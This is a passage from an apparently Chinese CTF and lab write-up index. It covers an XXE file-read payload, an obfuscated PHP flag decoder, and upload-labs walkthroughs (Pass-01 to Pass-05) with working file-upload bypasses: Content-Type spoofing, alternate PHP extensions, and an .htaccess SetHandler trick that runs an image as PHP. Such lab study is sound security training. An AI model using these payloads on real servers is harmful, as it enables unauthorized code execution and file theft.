\"/etc/.flag.php\"&gt;\n]&gt;\n&lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;hj&lt;/password&gt;&lt;/root&gt;\n</code></pre> <p>\u5f97\u5230\u4e86\u4e00\u4e32\u5f88\u5947\u602a\u7684\u7801\uff1a</p> Text Only<pre><code>$_[]++;$_[]=$_._;$_____=$_[(++$__[])][(++$__[])+(++$__[])+(++$__[])];$_=$_[$_[+_]];$___=$__=$_[++$__[]];$____=$_=$_[+_];$_++;$_++;$_++;$_=$____.++$___.$___.++$_.$__.++$___;$__=$_;$_=$_____;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=+_;$___.=$__;$___=++$_^$___[+_];$\u00c0=+_;$\u00c1=$\u00c2=$\u00c3=$\u00c4=$\u00c6=$\u00c8=$\u00c9=$\u00ca=$\u00cb=++$\u00c1[];$\u00c2++;$\u00c3++;$\u00c3++;$\u00c4++;$\u00c4++;$\u00c4++;$\u00c6++;$\u00c6++;$\u00c6++;$\u00c6++;$\u00c8++;$\u00c8++;$\u00c8++;$\u00c8++;$\u00c8++;$\u00c9++;$\u00c9++;$\u00c9++;$\u00c9++;$\u00c9++;$\u00c9++;$\u00ca++;$\u00ca++;$\u00ca++;$\u00ca++;$\u00ca++;$\u00ca++;$\u00ca++;$\u00cb++;$\u00cb++;$\u00cb++;$\u00cb++;$\u00cb++;$\u00cb++;$\u00cb++;$__('$_=\"'.$___.$\u00c1.$\u00c2.$\u00c3.$___.$\u00c1.$\u00c0.$\u00c1.$___.$\u00c1.$\u00c0.$\u00c8.$___.$\u00c1.$\u00c0.$\u00c3.$___.$\u00c1.$\u00c2.$\u00c3.$___.$\u00c1.$\u00c2.$\u00c0.$___.$\u00c1.$\u00c9.$\u00c3.$___.$\u00c1.$\u00c9.$\u00c0.$___.$\u00c1.$\u00c9.$\u00c0.$___.$\u00c1.$\u00c4.$\u00c6.$___.$\u00c1.$\u00c3.$\u00c9.$___.$\u00c1.$\u00c6.$\u00c1.$___.$\u00c1.$\u00c8.$\u00c3.$___.$\u00c1.$\u00c3.$\u00c9.$___.$\u00c1.$\u00c8.$\u00c3.$___.$\u00c1.$\u00c6.$\u00c9.$___.$\u00c1.$\u00c3.$\u00c9.$___.$\u00c1.$\u00c4.$\u00c6.$___.$\u00c1.$\u00c4.$\u00c1.$___.$\u00c1.$\u00c8.$\u00c3.$___.$\u00c1.$\u00c9.$\u00c1.$___.$\u00c1.$\u00c9.$\u00c6.'\"');$__($_);\n</code></pre> <p>\u731c\u6d4b\u662fPHP\u4ee3\u7801\uff0c\u90a3\u5c31\u627e\u4e00\u4e9b\u5728\u7ebfPHP\u8fd0\u884c\u7f51\u7ad9\uff0c\u8fd0\u884c\u7684\u65f6\u5019\u8bb0\u5f97\u518d\u5916\u8fb9\u5957\u4e0a<code>&lt;?php ?&gt;</code>\u3002</p> <p>\u6ce8\u610f\uff0c\u5728PHP7\u73af\u5883\u4e0b\u8fd0\u884c\u4e0d\u51faflag\uff0cPHP5.6\u624d\u884c\u3002\u5f53\u7136\u672c\u5730\u8fd0\u884c\u4e00\u4e0b\u4e5f\u884c\u3002</p> <p>https://code.y444.cn/php\uff08\u8fd9\u4e2a\u7f51\u7ad9\u53ef\u4ee5\u5207\u6362PHP\u7248\u672c\uff09</p> <p>\u6700\u7ec8\u663e\u793a\u51fa\u4e86FLAG\uff0c<code>SAFCSP{xxe_is_so_easy}</code></p>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/","title":"Upload labs\u9776\u573a\u6253\u9776\u8bb0\u5f55","text":""},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#upload-labs","title":"\u4e00\u3001upload-labs \u9776\u573a\u7b80\u4ecb","text":"<p>upload-labs\u662f\u4e00\u4e2a\u4f7f\u7528php\u8bed\u8a00\u7f16\u5199\u7684\uff0c\u4e13\u95e8\u6536\u96c6\u6e17\u900f\u6d4b\u8bd5\u548cCTF\u4e2d\u9047\u5230\u7684\u5404\u79cd\u4e0a\u4f20\u6f0f\u6d1e\u7684\u9776\u573a\u3002\u65e8\u5728\u5e2e\u52a9\u5927\u5bb6\u5bf9\u4e0a\u4f20\u6f0f\u6d1e\u6709\u4e00\u4e2a\u5168\u9762\u7684\u4e86\u89e3\u3002\u76ee\u524d\u4e00\u517121\u5173\uff0c\u6bcf\u4e00\u5173\u90fd\u5305\u542b\u7740\u4e0d\u540c\u4e0a\u4f20\u65b9\u5f0f\u3002</p> <ol> <li>\u6bcf\u4e00\u5173\u6ca1\u6709\u56fa\u5b9a\u7684\u901a\u5173\u65b9\u6cd5\uff0c\u5927\u5bb6\u4e0d\u8981\u81ea\u9650\u601d\u7ef4\uff01 2.\u672c\u9879\u76ee\u63d0\u4f9b\u7684writeup\u53ea\u662f\u8d77\u4e00\u4e2a\u53c2\u8003\u4f5c\u7528\uff0c\u5e0c\u671b\u5927\u5bb6\u53ef\u4ee5\u5206\u4eab\u51fa\u81ea\u5df1\u7684\u901a\u5173\u601d\u8def\u3002 3.\u5b9e\u5728\u6ca1\u6709\u601d\u8def\u65f6\uff0c\u53ef\u4ee5\u70b9\u51fb\u67e5\u770b\u63d0\u793a\u3002 4.\u5982\u679c\u9ed1\u76d2\u60c5\u51b5\u4e0b\uff0c\u5b9e\u5728\u505a\u4e0d\u51fa\uff0c\u53ef\u4ee5\u70b9\u51fb\u67e5\u770b\u6e90\u7801\u3002</li> </ol> <p>\u540e\u7eed\u5982\u5728\u6e17\u900f\u6d4b\u8bd5\u5b9e\u6218\u4e2d\u9047\u5230\u65b0\u7684\u4e0a\u4f20\u6f0f\u6d1e\u7c7b\u578b\uff0c\u4f1a\u66f4\u65b0\u5230upload-labs\u4e2d\u3002\u5f53\u7136\u5982\u679c\u4f60\u4e5f\u5e0c\u671b\u53c2\u52a0\u5230\u8fd9\u4e2a\u5de5\u4f5c\u5f53\u4e2d\uff0c\u6b22\u8fcepull requests\u7ed9\u6211!</p> <p>\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/c0ny1/upload-labs</p>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#_1","title":"\u4e8c\u3001\u6253\u9776\u8bb0\u5f55","text":""},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-01-js","title":"Pass-01 JS \u6821\u9a8c","text":"<p>\u672c\u5173\u5361\u4e3aJS\u68c0\u9a8c\u3002\u6f0f\u6d1e\u63cf\u8ff0\uff1a\u5229\u7528\u524d\u7aef JS \u5bf9\u4e0a\u4f20\u6587\u4ef6\u540e\u7f00\u8fdb\u884c\u6821\u9a8c\uff0c\u540e\u7aef\u6ca1\u8fdb\u884c\u68c0\u6d4b</p> <p>\u5229\u7528\u65b9\u6cd5\uff1a</p> <ul> <li>\u6d4f\u89c8\u5668\u7981\u7528 js </li> <li>\u6d4f\u89c8\u5668\u524d\u7aef\u4fee\u6539</li> <li>Burp\u6293\u5305\u7ed5\u8fc7</li> </ul> <ol> <li> <p>\u901a\u8fc7\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u975e\u56fe\u7247\u683c\u5f0f\u7684\u6587\u4ef6\u786e\u5b9e\u65e0\u6cd5\u63d0\u4ea4\u4e0a\u53bb\uff0c\u6211\u4eec\u5148\u5c1d\u8bd5\u7b2c\u4e00\u79cd\u65b9\u6cd5\uff1a\u5728\u5f00\u53d1\u8005\u5de5\u5177\u4e2d\u7684\u8bbe\u7f6e\u4e2d\u627e\u5230\u201c\u505c\u7528<code>JavaScript</code>\u201d\uff0c\u9009\u4e2d\u5373\u53ef\uff0c\u6211\u4eec\u518d\u5c1d\u8bd5\u63d0\u4ea4\u975e\u56fe\u7247\u683c\u5f0f\u7684\u6587\u4ef6\uff0c\u53d1\u73b0\u6210\u529f\uff0c</p> </li> <li> <p>\u6211\u4eec\u5c1d\u8bd5\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u6d4f\u89c8\u5668\u524d\u7aef\u4fee\u6539\uff0c\u6211\u4eec\u89c2\u5bdf\u53ef\u4ee5\u53d1\u73b0\uff0c\u5728\u63d0\u4ea4\u8868\u5355\u65f6\u6d4f\u89c8\u5668\u4f1a\u7528<code>onsubmit</code>\u5c5e\u6027\u8fdb\u884c\u5224\u65ad\uff0c\u53ea\u6709\u7b26\u5408\u5176\u89c4\u5b9a\u4e4b\u540e\u624d\u53ef\u4ee5\u4e0a\u4f20\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u5c06\u8fd9\u91cc\u7684<code>onsubmit</code>\u5c5e\u6027\u4e2d\u7684<code>return checkFile()</code>\u51fd\u6570\u5220\u9664\uff0c\u4e5f\u5c31\u53ef\u4ee5\u5c06<code>return checkFile()</code>\u7834\u574f\u6389\uff1a(\u5728\u5b9a\u4e49<code>return checkFile()</code>\u5904\u5c06\u5176\u51fd\u6570\u7ed3\u6784\u7834\u574f)      \u4f46\u662f\uff0c\u6d4f\u89c8\u5668\u901a\u5e38\u4f1a\u5bf9\u8fd9\u4e2a\u884c\u4e3a\u8fdb\u884c\u4e00\u5b9a\u7684\u9650\u5236\uff0c\u6bd4\u5982\u7b14\u8005\u5728\u6d4b\u8bd5\u7684\u65f6\u5019\u53d1\u73b0\u7528Edge\u6d4f\u89c8\u5668\u4fbf\u65e0\u6cd5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u4e0a\u4f20\uff0c\u4f46\u662fFirefox\u6d4f\u89c8\u5668\u53ef\u4ee5\u3002</p> </li> <li> <p>\u7b2c\u4e09\u79cd\u65b9\u6cd5\u7684\u89e3\u91ca\uff1a\u56e0\u4e3a\u662f\u524d\u7aefjs\u62e6\u622a\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u5c06php\u6587\u4ef6\u540e\u7f00\u4fee\u6539\u6210\u5408\u6cd5\u7684\u683c\u5f0f\uff08.jpg\uff09\uff0c\u4f7f\u7528<code>burpsuite</code>\u6293\u5305\uff0c\u518d\u4fee\u6539<code>.php</code>\u540e\u7f00\uff0c\u4e5f\u53ef\u4ee5\u7ed5\u8fc7\u524d\u7aef\u9a8c\u8bc1\u3002</p> <p></p> </li> </ol>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-02-mime","title":"Pass-02 \u6587\u4ef6\u7c7b\u578b\u6821\u9a8c(MIME \u6821\u9a8c)","text":"<ol> <li>\u6f0f\u6d1e\u63cf\u8ff0\uff1a\u53ea\u68c0\u6d4b<code>content-type</code>\u5b57\u6bb5\u5bfc\u81f4\u7684\u6f0f\u6d1e\u3002(\u540e\u7aef\u5229\u7528 PHP \u7684\u5168\u5c40\u6570\u7ec4 <code>$_FILES()</code>\u83b7\u53d6\u4e0a\u4f20\u6587\u4ef6\u4fe1\u606f) \u5229\u7528\u65b9\u6cd5\uff1a\u4fee\u6539<code>content-type</code>\u5b57\u6bb5\u7684\u503c\u4e3a\u56fe\u7247\u683c\u5f0f\u3002</li> </ol> <p>\u5e38\u7528 content-type \u5b57\u6bb5\uff1a  - image/jpeg \uff1ajpg \u56fe\u7247\u683c\u5f0f  - image/png \uff1apng \u56fe\u7247\u683c\u5f0f   - image/gif \uff1agif \u56fe\u7247\u683c\u5f0f  - text/plain \uff1a\u7eaf\u6587\u672c\u683c\u5f0f   - text/xml \uff1a XML \u683c\u5f0f   - text/html \uff1a HTML \u683c\u5f0f</p> <ol> <li>\u6211\u4eec\u5c06\u6211\u4eec\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u76f4\u63a5\u4e0a\u4f20\uff0c\u53d1\u73b0\u63d0\u793a\u9519\u8bef\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u770b\u4e00\u770bBurp\u6293\u5230\u7684\u6570\u636e\u5305\uff0c\u53d1\u73b0\u73b0\u5728\u7684<code>content-type</code>\u5b57\u6bb5\u4e3a<code>application/octet-stream</code>  \uff08\u6211\u4e0a\u4f20\u4e86\u4e00\u4e2a.md\u683c\u5f0f\u6587\u4ef6\uff09\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u53ea\u9700\u8981\u5c06\u5176\u6539\u6210<code>image/jpeg</code>\u5373\u53ef</li> </ol> <p> </p>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-03","title":"Pass-03 \u6587\u4ef6\u540d\u540e\u7f00\u6821\u9a8c(\u9ed1\u540d\u5355\u7ed5\u8fc7)","text":"<p>\u6f0f\u6d1e\u63cf\u8ff0\uff1a\u4f7f\u7528\u9ed1\u540d\u5355\u7684\u65b9\u5f0f\u9650\u5236\u6587\u4ef6\u4e0a\u4f20\u7c7b\u578b\uff0c\u540e\u7aef\u5229\u7528<code>$_FILES()</code>\u548c <code>strrchr()</code>\u83b7\u53d6\u6587\u4ef6\u540d\u540e\u7f00\u3002\u88ab\u9650\u5236\u6587\u4ef6\u7c7b\u578b\uff1a .asp .aspx .php .jsp</p> <p>\u5229\u7528\u65b9\u6cd5\uff1a\u56e0\u4e3a\u662f\u5229\u7528\u9ed1\u540d\u5355\u6765\u9650\u5236\u6587\u4ef6\u4e0a\u4f20\u7c7b\u578b\uff0c\u627e\u6f0f\u7f51\u4e4b\u9c7c\u7ed5\u8fc7 \u4f8b\u5982\uff1a\u7279\u6b8a\u6587\u4ef6\u540d\u7ed5\u8fc7\uff1a .php3 .php4 .php5 .phtml .phtm .phps .phpt .php345</p> <ol> <li>\u540e\u7aef\u4ee3\u7801\u5982\u4e0b\uff1a\u53d1\u73b0\u5176\u53ea\u662f\u9650\u5236\u4e86 .asp .aspx .php .jsp</li> </ol> <p>PHP<pre><code>$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array('.asp','.aspx','.php','.jsp');\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//\u5220\u9664\u6587\u4ef6\u540d\u672b\u5c3e\u7684\u70b9\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //\u8f6c\u6362\u4e3a\u5c0f\u5199\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//\u53bb\u9664\u5b57\u7b26\u4e32::$DATA\n        $file_ext = trim($file_ext); //\u6536\u5c3e\u53bb\u7a7a\n\n        if(!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;            \n            if (move_uploaded_file($temp_file,$img_path)) {\n                 $is_upload = true;\n            } else {\n                $msg = '\u4e0a\u4f20\u51fa\u9519\uff01';\n            }\n        } else {\n            $msg = '\u4e0d\u5141\u8bb8\u4e0a\u4f20.asp,.aspx,.php,.jsp\u540e\u7f00\u6587\u4ef6\uff01';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '\u6587\u4ef6\u5939\u4e0d\u5b58\u5728,\u8bf7\u624b\u5de5\u521b\u5efa\uff01';\n    }\n}\n</code></pre> 2. \u56e0\u6b64\u6211\u4eec\u5c06\u6211\u4eec\u8981\u4e0a\u4f20\u7684php\u6587\u4ef6\u6539\u6210<code>.php3 .php4 .php5 .phtml .phtm .phps .phpt .php345</code>\u4efb\u610f\u4e00\u79cd\u5373\u53ef\u3002 3. \u6ce8\u610f\uff1a\u8981\u5728<code>apache</code>\u7684<code>httpd.conf</code>\u4e2d\u6709\u5982\u4e0b\u914d\u7f6e\u4ee3\u7801\uff1aAddType application/x-httpd-php .php .phtml .phps .php5 .pht\uff0c\u5982\u679c\u4e0d\u914d\u7f6e\u7684\u8bdd\u662f\u65e0\u6cd5\u89e3\u6790php5\u4ee3\u7801\u7684\uff0c\u8bbf\u95ee\u7684\u65f6\u5019\u5c31\u662f\u4e00\u4e2a\u7a7a\u767d\u9875</p>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-04-htaccess","title":"Pass-04 \u6587\u4ef6\u540d\u540e\u7f00\u6821\u9a8c (\u914d\u7f6e\u6587\u4ef6\u89e3\u6790\u63a7\u5236) .htaccess","text":"<p>\u5206\u6790\u6e90\u7801\uff1a\u6211\u4eec\u53d1\u73b0\u8fd9\u4e00\u5173\u7684\u8fc7\u6ee4\u6bd4\u7b2c\u4e09\u8fc7\u66f4\u591a\u4e86\uff0c\u4f7f\u7528\u7b2c\u4e09\u5173\u7684\u65b9\u6cd5\u662f\u884c\u4e0d\u901a\u4e86\u3002 \u4f46\u662f\u6ca1\u6709\u9650\u5236 <code>.htaccess</code></p> <p>\u8865\u5145\u77e5\u8bc6\uff1a <code>.htaccess</code>\u6587\u4ef6\u662f<code>Apache</code>\u670d\u52a1\u5668\u4e2d\u7684\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u5b83\u8d1f\u8d23\u76f8\u5173\u76ee\u5f55\u4e0b\u7684\u7f51\u9875\u914d\u7f6e\uff0c\u901a\u8fc7<code>.htaccess</code>\u6587\u4ef6\uff0c\u53ef\u4ee5\u5b9e\u73b0\uff1a\u7f51\u9875301\u91cd\u5b9a\u5411\u3001\u81ea\u5b9a\u4e49404\u9875\u9762\u3001\u6539\u53d8\u6587\u4ef6\u6269\u5c55\u540d\u3001\u5141\u8bb8/\u963b\u6b62\u7279\u5b9a\u7684\u7528\u6237\u6216\u8005\u76ee\u5f55\u7684\u8bbf\u95ee\u3001\u7981\u6b62\u76ee\u5f55\u5217\u8868\u3001\u914d\u7f6e\u9ed8\u8ba4\u6587\u6863\u7b49\u529f\u80fd</p> <p>\u4e0a\u4f20\u5185\u5bb9\u4e3a\u4ee5\u4e0b\u4ee3\u7801\u7684<code>.htaccess</code>\u6587\u4ef6\uff0c\u53cc\u5f15\u53f7\u5185\u4e3a\u4f60\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\u3002 PHP<pre><code>&lt;FilesMatch \"jpg\"&gt;   \n        SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n</code></pre> 1. \u6211\u4eec\u5148\u770b\u4e00\u770b\u540e\u7aef\u4ee3\u7801 PHP<pre><code>$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//\u5220\u9664\u6587\u4ef6\u540d\u672b\u5c3e\u7684\u70b9\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //\u8f6c\u6362\u4e3a\u5c0f\u5199\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//\u53bb\u9664\u5b57\u7b26\u4e32::$DATA\n        $file_ext = trim($file_ext); //\u6536\u5c3e\u53bb\u7a7a\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '\u4e0a\u4f20\u51fa\u9519\uff01';\n            }\n        } else {\n            $msg = '\u6b64\u6587\u4ef6\u4e0d\u5141\u8bb8\u4e0a\u4f20!';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '\u6587\u4ef6\u5939\u4e0d\u5b58\u5728,\u8bf7\u624b\u5de5\u521b\u5efa\uff01';\n    }\n}\n</code></pre> 2. \u4ece\u4ee5\u4e0a\u4ee3\u7801\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u5173\u8fc7\u6ee4\u4e86\u5927\u91cf\u7684\u80fd\u591f\u88ab\u89e3\u6790\u6210php\u7684\u540e\u7f00\uff0c\u4f46\u662f\u6ca1\u6709\u5bf9<code>.htaccess</code>\u7684\u6587\u4ef6\u8fdb\u884c\u8fc7\u6ee4\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5<code>.htaccess</code>\u4e0a\u4f20\u7684\u65b9\u5f0f\u7ed5\u8fc7\u3002 3. \u6211\u4eec\u5148\u4e0a\u4f20\u4e00\u4e2a<code>.htaccess</code>\u6587\u4ef6,\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;FilesMatch \"1.jpg\"&gt;\n    SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n</code></pre> <p>htaccess\u6587\u4ef6\u662fApache\u670d\u52a1\u5668\u4e2d\u7684\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u5b83\u8d1f\u8d23\u76f8\u5173\u76ee\u5f55\u4e0b\u7684\u7f51\u9875\u914d\u7f6e\u3002\u901a\u8fc7htaccess\u6587\u4ef6\uff0c\u53ef\u4ee5\u5e2e\u6211\u4eec\u5b9e\u73b0\uff1a\u7f51\u9875301\u91cd\u5b9a\u5411\u3001\u81ea\u5b9a\u4e49404\u9519\u8bef\u9875\u9762\u3001\u6539\u53d8\u6587\u4ef6\u6269\u5c55\u540d\u3001\u5141\u8bb8/\u963b\u6b62\u7279\u5b9a\u7684\u7528\u6237\u6216\u8005\u76ee\u5f55\u7684\u8bbf\u95ee\u3001\u7981\u6b62\u76ee\u5f55\u5217\u8868\u3001\u914d\u7f6e\u9ed8\u8ba4\u6587\u6863\u7b49\u529f\u80fd\u3002</p> <p>\u5728\u4e0a\u8ff0\u914d\u7f6e\u4e2d\uff0cFilesMatch\u8868\u793a\u5339\u914d1.png\u7684\u6587\u4ef6\uff0c\u5f53\u8be5\u6587\u4ef6\u540d\u5339\u914d\u6210\u529f\u540e\uff0cSetHandler\u8868\u793a\u5c06\u8be5\u6587\u4ef6\u4f5c\u4e3aPHP\u7c7b\u578b\u7684\u6587\u4ef6\u6765\u8fdb\u884c\u5904\u7f6e\u3002\u7136\u540e\u4e0a\u4f20\u8be5\u6587\u4ef6\u3002</p> <p></p> <ol> <li>\u4e4b\u540e\uff0c\u6211\u4eec\u518d\u4e0a\u4f20\u4e00\u4e2ajpg\u6587\u4ef6\uff0c\u6ce8\u610f\uff0c\u8fd9\u4e2ajpg\u6587\u4ef6\u5e76\u4e0d\u662f\u6b63\u5e38\u7684\u6587\u4ef6\uff01\uff01     \u90a3\u4e48\u6211\u4eec\u518d\u521b\u5efa\u4e00\u4e2aphp\u6587\u4ef6\uff0c\u5176\u5185\u5bb9\u8bbe\u7f6e\u4e3a<code>&lt;?php  phpinfo(); ?&gt;</code>\uff0c\u7136\u540e\u518d\u5c06\u6b64\u6587\u4ef6\u540e\u7f00\u6539\u4e3ajpg\uff0c\u4e0a\u4f20\u3002</li> </ol> <p></p> <ol> <li> <p>\u4e4b\u540e\u6211\u4eec\u518d\u8bbf\u95ee\u4e0a\u4f20\u4e0a\u7684\u56fe\u7247\uff0c\u4fbf\u53ef\u4ee5\u6210\u529f\u770b\u5230phpinfo\u754c\u9762\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f<code>.htaccess</code>\u6587\u4ef6\u662f<code>apache</code>\u9ed8\u8ba4\u7684\u6587\u4ef6\u540d\uff0c\u6240\u4ee5\u5982\u679c\u540e\u53f0\u6709\u5bf9\u4e0a\u4f20\u6587\u4ef6\u5f3a\u5236\u6539\u540d\u7684\u673a\u5236\uff0c\u90a3\u4e48\u8fd9\u79cd\u65b9\u6cd5\u4e5f\u5c31\u5931\u6548\u4e86\u3002</p> </li> <li> <p>\u5176\u5b9e\u6211\u4e0a\u9762\u7684\u6b65\u9aa4\u505a\u9519\u4e86\uff0c\u6ce8\u610f<code>.htaccess</code>\u6587\u4ef6\u4e0d\u80fd\u8d77\u540d\u5b57\uff0c\u4ed6\u5c31\u662f<code>.htaccess</code>\u6587\u4ef6\uff0c\u5982\u679c\u4f60\u5c06\u4ed6\u6539\u4e3a<code>4.htaccess</code>\u6216\u8005\u5176\u4ed6\u7684\u4ec0\u4e48\u540d\u5b57\u662f\u4e0d\u53ef\u4ee5\u7684\uff0c\u65e0\u6cd5\u89e3\u6790\u3002\u5728\u5b9e\u6218\u4e2d\u6709\u53ef\u80fd\u4e0a\u4f20\u4e0a\u53bb\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u88ab\u81ea\u52a8\u91cd\u547d\u540d\uff0c\u88ab\u91cd\u547d\u540d\u4e86\u5c31\u4e0d\u53ef\u4ee5\u4e86\u3002</p> </li> </ol>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-05-userini","title":"Pass-05 \u6587\u4ef6\u540d\u540e\u7f00\u6821\u9a8c (\u914d\u7f6e\u6587\u4ef6\u89e3\u6790\u63a7\u5236) .user.ini","text":"<p>htaccess \u4f5c\u7528:  \u5206\u5e03\u5f0f\u914d\u7f6e\u6587\u4ef6\uff0c\u4e00\u822c\u7528\u4e8e URL\u00b7\u91cd\u5199\u3001\u8ba4\u8bc1\u3001\u8bbf\u95ee\u63a7\u5236\u7b49(\u4f5c\u7528\u8303\u56f4:\u7279\u5b9a\u76ee\u5f55 (\u4e00\u822c\u662f\u7f51\u7ad9\u6839\u76ee\u5f55) \u53ca\u5176\u5b50\u76ee\u5f55 \u4f18\u5148\u7ea7:  \u8f83\u9ad8\uff0c\u53ef\u8986\u76d6 Apache\u00b7\u7684\u4e3b\u8981\u914d\u7f6e\u6587\u4ef6(httpd-conf) \u751f\u6548\u65b9\u5f0f:  \u4fee\u6539\u540e\u7acb\u523b\u751f\u6548\u201c</p> <p>httpd-conf \u4f5c\u7528:  \u5305\u542b ApacheHTTP\u00b7\u670d\u52a1\u5668\u7684\u5168\u5c40\u884c\u4e3a\u548c\u9ed8\u8ba4\u8bbe\u7f6e\u4f5c\u7528\u8303\u56f4:\u6574\u4e2a\u670d\u52a1\u5668 \u4f18\u5148\u7ea7:  \u8f83\u4f4e \u751f\u6548\u65b9\u5f0f:  \u7ba1\u7406\u5458\u6743\u9650\uff0c\u91cd\u542f\u670d\u52a1\u5668\u540e\u751f\u6548\u201c</p> <p>.user.ini \u4f5c\u7528:  \u7279\u5b9a\u4e8e\u7528\u6237\u6216\u7279\u5b9a\u76ee\u5f55\u7684\u914d\u7f6e\u6587\u4ef6,\u901a\u5e38\u4f4d\u4e8e\u00b7Web\u00b7\u5e94\u7528\u7a0b\u5e8f\u7684\u6839\u76ee\u5f55\u4e0b\u3002\u5b83\u7528\u4e8e\u8986\u76d6\u6216\u8ffd\u52a0\u5168\u5c40\u914d\u7f6e\u6587\u4ef6 (\u5982php.ini) \u4e2d\u7684PHP\u914d\u7f6e\u9009\u9879\u3002\u4f5c\u7528\u8303\u56f4:\u5b58\u653e\u8be5\u6587\u4ef6\u7684\u76ee\u5f55\u4ee5\u53ca\u5176\u5b50\u76ee\u5f55 \u4f18\u5148\u7ea7:  \u8f83\u9ad8\uff0c\u53ef\u4ee5\u8986\u76d6 php.ini \u751f\u6548\u65b9\u5f0f:  \u7acb\u5373\u751f\u6548 php.ini \u4f5c\u7528:\u5b58\u50a8\u4e86\u5bf9\u6574\u4e2a\u00b7PHP\u00b7\u73af\u5883\u751f\u6548\u7684\u914d\u7f6e\u9009\u9879\u3002\u5b83\u901a\u5e38\u4f4d\u4e8ePHP\u5b89\u88c5\u76ee\u5f55\u4e2d\u4f5c\u7528\u8303\u56f4:\u6240\u6709\u8fd0\u884c\u5728\u8be5PHP\u73af\u5883\u4e2d\u7684PHP\u8bf7\u6c42 \u4f18\u5148\u7ea7:  \u8f83\u4f4e \u751f\u6548\u65b9\u5f0f:  \u91cd\u542f php\u6216 web \u670d\u52a1\u5668</p> <p>\u52a0\u8f7d\u65b9\u5f0f: \u4f1a\u9996\u5148\u52a0\u8f7dphp.ini/httpd-conf \u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u3002\u7136\u800c\uff0c\u5982\u679c\u5728\u67d0\u4e2a\u76ee\u5f55\u4e0b\u5b58\u5728.userini/.htaccess\u6587\u4ef6\u670d\u52a1\u5668\u4f1a\u5728\u5904\u7406\u8bf7\u6c42\u65f6\u68c0\u67e5\u8be5\u76ee\u5f55\uff0c\u5e76\u8986\u76d6\u76f8\u5e94\u7684\u914d\u7f6e\u9879\u3002</p> <p>.user.ini \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7684\u524d\u63d0\uff1a .user.ini \u53ef\u4ee5\u751f\u6548\u5e76\u4e14\u8be5\u4e0a\u4f20\u76ee\u5f55\u6709PHP\u6587\u4ef6</p> <ol> 